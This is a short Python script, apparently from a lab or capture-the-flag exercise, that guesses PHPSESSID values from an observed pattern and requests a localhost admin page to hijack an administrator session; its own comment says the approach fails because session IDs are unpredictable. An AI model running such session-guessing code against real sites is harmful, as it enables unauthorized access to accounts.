import requests
import re

# This does not work due to session ID is not predictable.

for i in range(100, 150):  # Predict likely session IDs
    session_id = f"abc{i % 50}def{3 * i}"  # Pattern observed in tmp files
    cookies = {'PHPSESSID': session_id}
    response = requests.get('http://localhost/admin.php', cookies=cookies)
    if "Admin Panel" in response.text:
        print(f"[+] Hijacked admin session: {session_id}")
        break
